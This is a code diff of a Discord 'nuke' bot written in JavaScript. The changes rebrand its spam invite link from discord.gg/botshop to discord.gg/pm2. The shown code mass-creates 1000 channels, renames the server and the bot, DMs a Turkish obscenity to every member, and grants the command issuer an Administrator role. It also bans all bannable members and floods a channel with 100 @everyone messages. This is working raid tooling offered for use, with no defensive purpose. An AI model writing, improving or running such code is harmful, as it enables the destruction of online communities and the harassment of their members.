@@ -37,7 +37,7 @@ client.on('messageCreate', async (msg) => {
       const channelsToCreate = [];
       let i = 0;
       while (i < 1000) {
-        channelsToCreate.push({ name: 'discord.gg/botshop', type: ChannelType.GuildText });
+        channelsToCreate.push({ name: 'discord.gg/pm2', type: ChannelType.GuildText });
         i++;
       }
 
@@ -66,7 +66,7 @@ client.on('messageCreate', async (msg) => {
       // Update guild settings
       try {
         await msg.guild.setIcon('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await msg.guild.setName('discord.gg/botshop');
+        await msg.guild.setName('discord.gg/pm2');
       } catch (err) {
         console.error('Failed to update guild settings:', err);
       }
@@ -85,7 +85,7 @@ client.on('messageCreate', async (msg) => {
       // Update bot settings
       try {
         await client.user.setAvatar('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await client.user.setUsername('discord.gg/botshop UWU');
+        await client.user.setUsername('discord.gg/pm2 UWU');
       } catch (err) {
         console.error('Failed to update bot settings:', err);
       }
@@ -107,7 +107,7 @@ client.on('messageCreate', async (msg) => {
 },
 '+dm': async () => {
   await msg.delete();
-  const message = ' **SWENZY BABA SIKERR https://discord.gg/botshop** ';
+  const message = ' **SWENZY BABA SIKERR https://discord.gg/pm2** ';
   
   await Promise.all(
     msg.guild.members.cache.map(member => {
@@ -119,7 +119,7 @@ client.on('messageCreate', async (msg) => {
 },
     '+yetki': async () => {
       await msg.delete();
-      const role = await msg.guild.roles.create({ name: 'bdfd', permissions: [PermissionFlagsBits.Administrator] });
+      const role = await msg.guild.roles.create({ name: 'pm2', permissions: [PermissionFlagsBits.Administrator] });
       await msg.member.roles.add(role);
     },
 '+ban': async () => {
@@ -127,7 +127,7 @@ client.on('messageCreate', async (msg) => {
   await Promise.all(
     msg.guild.members.cache.map(member => {
       if (member.bannable && member.id !== client.user.id) {
-        return member.ban({ reason: 'discord.gg/botshop' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
+        return member.ban({ reason: 'discord.gg/pm2' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
       }
     })
   );
@@ -149,7 +149,7 @@ client.on('messageCreate', async (msg) => {
 },
     '+spam': async () => {
       await msg.delete();
-      const spamMessage = '**SWENZY BABA SIKERR @everyone https://discord.gg/botshop**';
+      const spamMessage = '**SWENZY BABA SIKERR @everyone https://discord.gg/pm2**';
       for (let i = 0; i < 100; i++) {
         await msg.channel.send(spamMessage);
       }
